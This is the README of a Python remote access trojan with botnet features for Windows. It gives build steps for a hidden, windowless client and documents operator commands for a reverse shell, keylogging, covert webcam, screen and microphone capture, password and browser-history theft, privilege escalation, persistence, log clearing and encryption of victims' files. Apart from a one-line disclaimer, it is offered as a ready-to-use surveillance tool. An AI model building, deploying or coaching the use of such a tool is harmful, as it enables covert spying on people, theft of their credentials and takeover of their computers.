## Alvin
Free, open-source remote access tool with botnet functionality for Windows.

## Description
Alvin is an open-source TCP application protocol used to control multiple computers transfering requested data over to the server without interference by the client user. Supporting large amount of features with a whide range of options. Alvin demonstrates the possibilities of python used in conjunction with other open-source projects.

## Installation
#### **Command prompt 1**
* git clone https://github.com/Alvin-22/Alvin.git
* cd Alvin
* pip install -r ~build/requirements.txt
* Download packages from hyperlinks in ~build/requirements/requirements_not_available_with_pip.txt
* python server.py

#### **Command prompt 2**
* python client.py

## EXE installation
#### **Command prompt 1 (server install)**
* cd Alvin
* pyinstaller -F -i [server icon path] [server script path]

#### **Command prompt 2 (client install)**
* cd Alvin
* pyinstaller -F -w -i [client icon path] [client script path]

The difference between the EXE installations is that the client script is windowless (-w), becoming a background process operation without the interference of the user.

## Features
* TCP Network Stream (IPv4)
* Deflate Compression & AES128 Encryption
* Automatic Documentation
* Stable Remote Shell
* Desktop Stream (Multi Monitor)
* Cam Stream (Multi Monitor)
* Audio Listener (Mic & Loopback Audio)
* Audio Output
* Keylogger
* Screenshot
* Cam Screenshot
* Upload (Execute)
* Download (Execute)
* File Encryption / Decryption
* Keystroke Injection
* Mouse Action Injection
* Python Interpreter (Print Result to Server)
* Keyboard & Mouse Lock / Unlock
* Password Recovery ([LaZagne Project](https://github.com/AlessandroZ/LaZagne))
* Browser History Recovery ([browserhistory](https://github.com/kcp18/browserhistory))
* Privilege Escelation
* Clearing Windows Logs
* Show Messagebox
* Open Websites
* System Actions
  * Shutdown
  * Restart
  * Logout
  * Standby

## Documentation
Alvin operates in two modes, the first is what's called the "shell" which is the client management mode, controlling things like listing clients, deleting clients & entering sessions with clients. The second mode is the "session" mode, this is the personal interaction mode with Z client, this gives you a reverse shell along with additional commands for a more powerful data collecting experience, this would for example be streaming the clients desktop, webcam or intercepting their audio communications.
___
#### **How to construct commands in Alvin**
Each command will be parsed & return a dictionary, the syntax for how to construct your commands correctly is as follows, first is the main command also known as the message which is the inital string, then for every argument to the command is prefixed with double dash (--). When dealing with indexes, it's all 0-based, consider 0 the first one. Commands will not care if the letters are lower / higher case unless it's specifically needed & will provide different output, an example of this is when using messagebox command, then you will need to specify the text to display, then the letter casing is taken into consideration.

An example of a command: image --screenshot --monitor 0
___
#### **Commands available in both shell & session (globally)**
* help
  * Show all available commands & their expected arguments. Optional arguments being surrounded by pareparentheses while brackets expect variable data. Alternative uses of Z command using a pipe character (|) & commands requireing both of two arguments in conjunction with the & sign (&).

* exit
  * Exits the program, removing connections with all clients.

* clear
  * Clears the command prompt window.

* sockets
  * Displays the status of every server socket, weather it's listening to clients. This is also used to view all running modules (stream, cam, audio & talk) & what client of which it's running on.

* options --available | --key [key] & --value [value]
  * View available options & their current settings, then you can change that setting by specifying the name of that command. For every abstraction level displayed in the menu, the key will be sequenced. An example of setting the safe option under the mode category would look like this: options --key mode/safe --value true. This will change how the program operates so the experience is based on your terms.

* stream --ip [ip] & --port [port] | --unbund | --close [index] | --status
  * When using the stream command a subset of all available commands can be used globally. This would be binding the socket to a specific ip & port, unbinding the socket, closing a specific running instance of a stream or checking the status of the socket, weather it's listening for clients or not.

* cam --ip [ip] & --port [port] | --unbund | --close [index] | --status
  * When using the cam command a subset of all available commands can be used globally. This would be binding the socket to a specific ip & port, unbinding the socket, closing a specific running instance of a cam or checking the status of the socket, weather it's listening for clients or not.

* audio --ip [ip] & --port [port] | --unbund | --close [index] | --status
  * When using the audio command a subset of all available commands can be used globally. This would be binding the socket to a specific ip & port, unbinding the socket, closing a specific running instance of a audio or checking the status of the socket, weather it's listening for clients or not.

* talk --ip [ip] & --port [port] | --unbund | --close [index] | --status
  * When using the talk command a subset of all available commands can be used globally. This would be binding the socket to a specific ip & port, unbinding the socket, closing a specific running instance of a talk or checking the status of the socket, weather it's listening for clients or not.


#### **Commands available in shell mode**
* list
  * A very commonly used command to list all connected clients, this will list the data in a table, displaying critical data of the clients.

* server --ip [ip] & --port [port] | --unbind | --status
  * This will impact the connecting of clients, to what ip & port your computer will listen on & accept clients. This is automatically bound to the address of localhost:1200, along with the modules being bound to localhost:1201-1204.

* session --index [index]
  * This command will be used to enter a session with a specific client, enabling session mode, providing a reverse shell with additional commands. The index of the connected clients is displayed in the first column of the list command.

* delete --index [index]
  * This will disconnect a connected client, note that all data about a client will be stored in the aftermath folder.

#### **Commands available in session mode**
* break
  * This will simply break out of the session & reenter shell mode.

* uninstall
  * This will delete the client file & disconnect itself, note that this command only works if the client script is an EXE.

* reconnect
  * This will reconnect a client, creating a new instance of itself, note that this command only works if the client script is an EXE.

* cd --to [directory]
  * This will change the directory path of the session reverse shell.

* image --screenshot | --cam (--monitor [index])
  * This will take a screenshot of Z monitor / webcam & show the image on the servers computer. You can specify the monitor, by default the monitor index is 0, the main monitor. But it supports any monitor / webcam available.

* upload --file [filename] | --url [url] (--execute)
  * Upload a file from the server computer, this command looks for files in aftermath/Files folder. Alternativly you can specify a direct link to an image / file from the internet & use that resource. You can also specify the instant execution of this uploaded file with the --execute command.

* download --file [file] (--execute)
  * Download a file from the client computer, this supports local pathing of the session reverse shell but also absolute paths. This file will be uploaded in aftermath/client name@client hostname/downloads/filename. The --execute option will automatically open the file upon download on the server computer.

* encrypt --file [filename] (--decrypt)
  * You can encrypt client computer files with the same encryption strength as the rest of the program with the same key & salt. The encryption key & salt is specified in the domestic/global_state.py file for the server, & foreign/global_state.py of the client. You can change this default key & salt, but note that the program requires having the same key & salt on both server & client scripts to work. By also specifying the --decrypt option, it will decrypt an already encrypted file.

* interpreter --execute [code] | --script [filename] (--quiet)
  * This will execute Python code directly on the clients computer, returning any result of print uses to the server computer, unless the --quiet argument is used. Any packages from the build of the EXE file will be available, but it does not support locally imported files. You can also specify a script file, it looks for script files in aftermath/Resources/Scripts.

* keylogger --run | --download | --close | --status (--quiet)
  * This will manage a keylogger, documenting the exact timestamps along with a neatly organized text structure. When the client uses space or enter buttons, it creates a new line. All logs are stored on the clients computer, you can change the filename of the file in foreign/global_state.py. Using the --quiet argument when downloading the logs will prevent the logs from being printed, upon completed download the keylogger file will be removed.

* keystroke --inject [inject] | --script [filename]
  * A keystroke injection supports both keyboard & mouse activity, just like the interpreter command it also supports scripts looking in the aftermath/Resources/Scripts/Keystroke folder.
  * The full list of available commands in the script is:
    * press [key]
      * Press the specific key down & up.
    * hold [key]
      * Hold down a specific key.
    * release [key]
      * Release a held down key.
    * type [text]
      * Types out specified text.
    * position [x,y]
      * Move the mouse relative to the cursor x & y pixels.
    * move [x,y]
      * Move the cursor to x & y position on the screen.
    * mhold [mouse button]
      * Hold the specified mouse down.
    * mrelease [mouse button]
      * Release the held down mouse button.
    * click [mouse button]
      * Click the specified mouse button down & up.
    * dclick [mouse button]
      * Double click the specified mouse button down & up.
    * scroll [x,y]
      * Scroll the specified x & y pixels.
    * sleep [seconds]
      * Wait the specified seconds until continuing the script.

* disable (--unlock)
  * This will disable the keyboard & mouse on the clients computer. To unlock the keyboard & mouse, you can simply specify --unlock.

* persistence --elevate | --schedule | --service
  * Attempting to elevate the scripts privileges will connect a new client if successful with admin privileges. note that this command only works if the client script is an EXE. You can also schedule the script to restart upon login or have the script run as a service, note that having the program as a service will limit any general use of the application. Windows only allow non-user specific actions to done by a service, something that still works is controlling the webcam.

* system --shutdown | --restart | --logout | --standby
  * Forcing actions on the client computer, note that using the scripts without persistence may be risky.

* recover --password | --history (--quiet) (--force)
  * This will attempt to recover data stored by commonly used programs on the clients computer, this will also print out the results on the servers computer, which the --quiet argument will avoid, the --force argument is used in conjuction with --history to force the browser to shutdown in case it's up. This is because you can not retrieve the browser history when it's running. Depending on the siutation this may be an alternative.

* obfuscate --logs
  * This will clear the windows logs, but requires admin privileges in the session reverse shell. Depending on the situation it may be an appropriate course of action.

* messagebox --title [title] --text [text] (--style [style])
  * Create a popup messagebox on the clients computer, specifying the title, text & style. The style is by default info icon.
  * The style options available are:
    * info
    * cross
    * question
    * warning

* website --open [open]
  * Open one or more websites seperated by comma in the deafult browser of the clients computer. Example of this: website --open google.com,youtube.com,github.com which opens all three websites in the same sequence.

* stream --resolution [resolution] (--monitor [index]) (--fps) (--fit) (--ip [ip] & --port [port]) (--recognize [haarcascade])
  * Stream the screen of specified monitor of the clients computer in the specified resolution. The --fps argument provides the fps of the stream in the top left corner, the --fit argument automatically sizes the stream to the resolution. The --ip & --port arguments is commonly used if your server is port forwarding & the server ip & port is not the same as the servers. The --recognize argument takes a haacascade file from aftermath/Resources/Haarcascades folder, if you want to use any kind of image recoginition on the stream.

* cam --resolution [resolution] (--monitor [index]) (--fps) (--fit) (--ip [ip] & --port [port]) (--recognize [haarcascade])
  * View the webcam of specified monitor of the clients computer in the specified resolution. The --fps argument provides the fps of the webcam in the top left corner, the --fit argument automatically sizes the webcam to the resolution. The --ip & --port arguments is commonly used if your server is port forwarding & the server ip & port is not the same as the servers. The --recognize argument takes a haacascade file from aftermath/Resources/Haarcascades folder, if you want to use any kind of image recoginition on the webcam.

* audio --run (--quiet) (--ip [ip] & --port [port])
  * Record the audio from the microphone & loopback audio from the soundcard, if you only want to create a sound file you can specify the --quiet argument. The --ip & --port arguments is commonly used if your server is port forwarding & the server ip & port is not the same as the servers.

* talk --run (--quiet) (--ip [ip] & --port [port])
  * Talk into your microphone at the servers computer & the clients computer will play that audio, if you only want to create a sound file you can specify the --quiet argument. The --ip & --port arguments is commonly used if your server is port forwarding & the server ip & port is not the same as the servers.

#### **Available options**
* mode/safe
  * The safe mode will garauntee that any command passed to the reverse shell gets killed after specified timeout of domestic/global_state.py file. The downside is that each command will take about 2 seconds longer to respond.
  
* mode/silent
  * The silent option will not view if any webcams are available upon client connection. This is because the webcam will light up for a quick second if there is a webcam.

* validation/duplicates
  * Will allow two connections of the same client connect. Note that this option is required for the persistence --elevate command to work, as it connects the same client again, but with admin privileges.

* validation/max-clients
  * Specify the number of clients to allow exist. Note that if there are hundreds of clients connected, the response of the program may be impacted, as the program automatically queues "keep-alive" packaets every minute to prevent the clients from disconnecting without any other socket activity.

* information-gathering/history
  * Keep a connection & disconnection log of every client.

* information-gathering/whoami
  * Stores a file on the client data upon connection.

* information-gathering/record/stream
  * Create a video recording out of every client stream.

* information-gathering/record/cam-stream
  * Create a video recording out of every client cam stream.

* information-gathering/record/audio
  * Create a audio recording from every audio session.

* information-gathering/record/talk
  * Create a talk recording from every talk session.

* information-gathering/save/screenshot
  * Store all screenshots taken of clients.

* information-gathering/save/cam-screenshot
  * Store all cam screenshots taken of clients.

* information-gathering/backup/text
  * Backup any command result sent in a session to a text file.

* information-gathering/backup/image
  * Backup any command result sent in a session to a text generated image file.

* notice/email-notice
  * Upon client connection an email will be attempted to be sent to specified email data below. Note that all the email data will never be stored anywhere, except in the program instance.

* notice/email-data/email
  * The gmail account the email will be sent from, note that you need to allow insecure applications to use your google account in order for email notifications to work.

* notice/email-data/password
  * The password to the email specified above, note that the password will be stored as plain text in the program.

* notice/email-data/to
  * The emails to send the client connection notice to. This is seperated by comma, this is often just your own email account, but supports any kind of email account, not just gmail. Example of this: example@gmail.com,example@hotmail.com,example@yahoo.com.

#### **Server command line arguments**
* --ipv4 [port]
  * The host servers ip address. The default is localhost.
* --port [port]
  * The hosting port, all module port sockets will be bound to the port number + 1-4. Default is 1200 & therefore 1201, 1202, 1203, 1204 for the modules.

#### **Client command line arguments**
* --ipv4 [port]
  * The ip address of the server to connect to. The default is localhost.
* --port [port]
  * The port of the server. Default is 1200.
___
_Please don't use Alvin for illegal purposes_